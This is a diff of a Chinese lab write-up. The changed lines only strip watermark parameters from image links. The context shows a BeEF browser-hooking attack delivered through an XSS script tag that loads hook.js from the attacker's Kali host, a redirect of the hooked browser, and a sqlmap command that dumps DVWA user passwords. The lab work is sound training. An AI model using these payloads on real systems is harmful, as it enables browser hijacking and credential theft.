@@ -44,16 +44,16 @@ Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），�
 - 如果使用Windows Server可能需要手动配置一下IP和网关使其与其他虚拟机处于同一网段。
 - 本次实验中虚拟机网络模式：Net模式
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117121506193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117121506193.png)
 ### 1x02 AWVS扫描
 首先我们使用AWVS扫描刚才搭建的网站
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/2020111712280017.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117122818910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117122851886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/2020111712280017.png)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117122818910.png)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117122851886.png)
 接下来一路继续就行，可能需要添加一个密码。然后就可以正常进行扫描了，扫描结果如下：
-![在这里插入图片描述](https://img-blog.csdnimg.cn/2020111712402383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117124044245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/2020111712402383.png)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117124044245.png)
 发现在error.asp和add.asp分别都有一个XSS漏洞。
 
 ### 1x03 Kail中使用Beef生成恶意代码
@@ -69,19 +69,19 @@ Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），�
 我们进入到提示的文件夹中进行一下修改
 用vim打开一下：`sudo vim /etc/beef-xss/config.yaml`
 不会使用vim的建议百度搜索一下用法，linux下经常会用到。
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117130248992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117130248992.png)
 我把账号和密码都修改为了beeff，之后保存退出。再输入 `./beef`
 
 - 使用默认用户可能会导致你安装失败
 输入`su`然后输入root密码，切换为root权限，然后再输入`./beef`
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117130624794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117130624794.png)
 会提示你现在已经启动了，然后打开kali中自带的firefox浏览器。进入到：
 `http://127.0.0.1:3000/ui/authentication`
-![在这里插入图片描述](https://img-blog.csdnimg.cn/2020111713111126.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/2020111713111126.png)
 输入你刚才设置的账号和密码，就可以成功的登陆了。
 
 访问一下hook.js里面有自带的恶意代码
-![在这里插入图片描述](https://img-blog.csdnimg.cn/2020111713564093.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/2020111713564093.png)
 只要访问到这个网站，对方的浏览器就会被劫持。
 
 ### 1x04 XSS注入漏洞
@@ -90,18 +90,18 @@ Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），�
 XSS注入代码如下：
 `<script src="http://Kali的IP地址:3000/hook.js"></script>`
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117140452295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117140452295.png)
 现在进入到这个当中我们可以发现已经成功了，而且看不到刚才写的代码，说明代码已经被成功的加载进去了！
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117140446773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117140446773.png)
 刷新一下界面，可以发现会有一个弹框：
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117140649183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117140649183.png)
 然后再回到kali里面的beef管理界面看一下，可以发现10.34.80.1也就是我的本机已经被劫持了！
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117140922301.png#pic_center)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117141052958.png#pic_center)
 可以使用他干一些奇怪的事情，还有查询一些信息
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117142326400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117142326400.png)
 #### 2x02 劫持浏览器指定被劫持网站为学校主页
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117150244138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117150244138.png)
 在命令中选择，Redirect Browser，填入学校地址，然后点击Execute。就可以发现网页被重定向了。
 
 本次实验中的XSS攻击属于注入型XSS攻击。
@@ -110,10 +110,10 @@ XSS注入代码如下：
 
 ### 1x01 实验环境搭建
 打开Metasploitable2后，里面有搭建好的DVWA，访问`http://Metasploitable的IP/dvwa`即可
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117161430968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117161430968.png)
 在low级别的SQL Injection中进行SQL注入的尝试：
 输入1，可以正常显示：
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117161631674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117161631674.png)
 输入1' 报错
 可以判断此处有报错：
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117161723620.png#pic_center)
@@ -160,7 +160,7 @@ XSS注入代码如下：
 `sqlmap -u "http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979" -D dvwa -T users -C user,password --dump
 `
 这里会询问你是否使用Kali中自带的字典进行攻击，选择是就好了
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117165159959.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117165159959.png)
 最后得到结果：
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117165304520.png#pic_center)
 
